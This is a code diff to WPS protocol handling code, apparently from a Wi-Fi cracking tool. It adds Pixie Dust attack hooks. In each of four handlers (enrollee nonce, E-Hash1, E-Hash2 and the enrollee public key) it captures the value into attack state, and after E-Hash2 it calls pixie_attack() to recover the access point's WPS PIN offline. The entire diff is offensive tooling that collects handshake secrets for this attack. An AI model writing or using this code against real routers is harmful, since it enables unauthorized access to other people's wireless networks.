@@ -25,6 +25,7 @@
 #include "wps_i.h"
 #include "wps_dev_attr.h"
 #include "../misc.h"
+#include "pixie.h"
 
 #define WPS_WORKAROUNDS
 
@@ -1695,6 +1696,12 @@ static int wps_process_enrollee_nonce(struct wps_data *wps, const u8 *e_nonce)
 	wpa_hexdump(MSG_DEBUG, "WPS: Enrollee Nonce",
 		    wps->nonce_e, WPS_NONCE_LEN);
 
+	if(pixie.do_pixie) {
+		char buf[2048];
+		pixie_format(wps->nonce_e, WPS_NONCE_LEN, buf);
+		PIXIE_SET(enonce, buf);
+	}
+
 	return 0;
 }
 
@@ -1753,6 +1760,12 @@ static int wps_process_e_hash1(struct wps_data *wps, const u8 *e_hash1)
 	os_memcpy(wps->peer_hash1, e_hash1, WPS_HASH_LEN);
 	wpa_hexdump(MSG_DEBUG, "WPS: E-Hash1", wps->peer_hash1, WPS_HASH_LEN);
 
+	if(pixie.do_pixie) {
+		char buf[2048];
+		pixie_format(wps->peer_hash1, WPS_HASH_LEN, buf);
+		PIXIE_SET(ehash1, buf);
+	}
+
 	return 0;
 }
 
@@ -1766,6 +1779,14 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
 
 	os_memcpy(wps->peer_hash2, e_hash2, WPS_HASH_LEN);
 	wpa_hexdump(MSG_DEBUG, "WPS: E-Hash2", wps->peer_hash2, WPS_HASH_LEN);
+
+	if(pixie.do_pixie) {
+		char buf[2048];
+		pixie_format(wps->peer_hash2, WPS_HASH_LEN, buf);
+		PIXIE_SET(ehash2, buf);
+
+		pixie_attack();
+	}
 
 	return 0;
 }
@@ -1898,6 +1919,12 @@ static int wps_process_pubkey(struct wps_data *wps, const u8 *pk,
 	wps->dh_pubkey_e = wpabuf_alloc_copy(pk, pk_len);
 	if (wps->dh_pubkey_e == NULL)
 		return -1;
+
+	if(pixie.do_pixie) {
+		char buf[2048];
+		pixie_format(pk, 192, buf);
+		PIXIE_SET(pke, buf);
+	}
 
 	return 0;
 }
